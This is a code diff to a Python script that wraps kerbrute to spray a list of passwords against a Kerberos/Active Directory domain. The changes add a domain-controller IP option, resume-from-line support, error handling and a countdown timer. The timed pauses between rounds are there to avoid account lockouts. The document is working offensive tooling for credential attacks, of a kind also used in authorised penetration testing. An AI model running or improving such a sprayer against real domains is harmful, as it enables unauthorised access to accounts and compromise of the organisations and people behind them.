@@ -7,13 +7,16 @@ import time
 
 # This script assumes you have kerbrute in /usr/local/bin/. It used kerbrute to spray a list of passwords, and wait a given amount of time in between each run.
 # I made this script to make password spraying more efficient and safer.
+# Recommended to add | tee -a passwordspray.log
 
 parser = argparse.ArgumentParser(description="Password sprayer using Kerbrute.",
                                  formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 parser.add_argument("--users", required=True, help="Path to username list.")
 parser.add_argument("--passwords", required=True, help="Path to password list.")
 parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
-parser.add_argument("--domain", help="Domain name.")
+parser.add_argument("--domain", required=True, help="Domain name.")
+parser.add_argument("--domain-ip", default="", help="Domain IP address.")
+parser.add_argument("--pwd-line", type=int, default=0, help="Line number of password to resume from (0 = start)")
 parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")
 
 args = parser.parse_args()
@@ -28,16 +31,49 @@ p = args.passwords
 s = args.sleep
 u = args.users
 d = args.domain
+ip = args.domain_ip
 a = args.attempts
 minutes = s*60
 i = 0
+j = args.pwd_line
 
 with open (p) as passwords:
-     while (password := passwords.readline().rstrip()):
-        subprocess.run([kerbrute_path, "passwordspray" , "-d", d, u , password], check=True)
+    for _ in range(j):
+        passwords.readline()
+    
+    while True:
+        password = passwords.readline()
+        if not password:
+            print("All passwords have been sprayed. Exiting...")
+            break
+        password = password.strip()
+        
+        try:
+            if ip != "":
+                subprocess.run([kerbrute_path, "passwordspray" , "-d", d, "--dc", ip, u , password], check=True)
+            else:
+                subprocess.run([kerbrute_path, "passwordspray" , "-d", d, u , password], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Kerbrute error: {e}")
+            continue
+        
+        print(f"[Processed: {j}] Sprayed password: {password}")
+        sys.stdout.flush()
+        
         i += 1
+        j += 1
         if i == a:
             i = 0
-            print("sleeping for", s,  "minute(s)")
+            print(f"Sleeping for {s} minute(s) after {a} attempt(s)...")
+            print(f"Resume with --pwd-line {j} if interrupted")
             sys.stdout.flush()
-            time.sleep(minutes)
+            
+            remaining_time = minutes
+            while remaining_time > 0:
+                mins, secs = divmod(remaining_time, 60)
+                time_format = f"{mins:02d}:{secs:02d}"
+                print(f"\rTime remaining: {time_format}", end="", flush=True)
+                time.sleep(1)
+                remaining_time -= 1
+                
+            print("\nResuming password spray...")
